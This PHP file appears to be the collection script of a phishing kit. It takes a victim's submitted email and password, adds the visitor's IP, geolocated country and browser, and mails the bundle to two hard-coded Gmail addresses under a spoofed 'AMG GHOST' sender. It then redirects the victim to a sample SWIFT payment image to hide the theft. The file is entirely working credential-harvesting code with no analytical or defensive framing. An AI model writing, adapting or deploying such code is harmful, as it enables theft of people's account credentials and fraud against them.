<?php
$ip = getenv("REMOTE_ADDR");
$country = visitor_country();
$login = $_POST['amg-em'];
$passwd = $_POST['amg-pd'];
$own = 'igastu22@gmail.com ,philip.imoh627@gmail.com';
$browser = $_SERVER['HTTP_USER_AGENT'];
$inj = $_SERVER["REQUEST_URI"];
$domain = 'AMG PYMT|COPY';
$sender = 'AMG-|#GHOST';
$subj = "$domain LOGZ";
$headers .= "From: AMG GHOST|#s3rv3r<$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$over = 'https://help.flywire.com/hc/article_attachments/360008382580/Sample-Swift.jpg';
$msg = "<HTML><BODY>
 <TABLE>
 <tr><td>____AMG-ICQ: @The_Devil____</td></tr>
 <tr><td>ID: >$login<<td/></tr>
 <tr><td>Access: >$passwd<</td></tr>
 <tr><td>IP: $country | <a href='http://whoer.net/check?host=$ip' target='_blank'>$ip</a> </td></tr>
 <tr><td>User Agent: >$browser<</td></tr>
 <tr><td>>SKYPE: Korea Ip<</td></tr>
 </BODY>
 </HTML>";
if (empty($login) || empty($passwd)) {
header( "Location: https://help.flywire.com/hc/article_attachments/360008382580/Sample-Swift.jpg" );
}
else {
mail($own,$subj,$msg,$headers);
header("Location: $over");
}

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
function visitor_countryCode()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryCode != null)
    {
        $result = $ip_data->geoplugin_countryCode;
    }

    return $result;
}
function visitor_regionName()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_regionName != null)
    {
        $result = $ip_data->geoplugin_regionName;
    }

    return $result;
}
function visitor_continentCode()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_continentCode != null)
    {
        $result = $ip_data->geoplugin_continentCode;
    }

    return $result;
}
?>